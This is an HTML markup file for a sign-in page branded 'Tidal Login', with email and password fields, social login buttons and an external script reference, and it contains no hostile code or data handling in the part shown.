<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tidal Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-wrapper">
        <div class="login-box">
            <div class="logo">
                <img src="tidal logo.svg" alt="Tidal Logo">
            </div>
            <h2>Sign In</h2>
            <form id="loginForm" onsubmit="return handleSubmit()">
                <div class="input-group">
                    <input type="email" id="email" placeholder="Email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="submit-group">
                    <button type="submit">Sign In</button>
                </div>
            </form>
            <p class="forgot-password"><a href="#">Forgot your password?</a></p>
            <p class="divider">or</p>
            <div class="social-login">
                <button class="social-btn">Continue with Facebook</button>
                <button class="social-btn">Continue with Apple</button>
                <button class="social-btn">Continue with Google</button>
            </div>
            <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
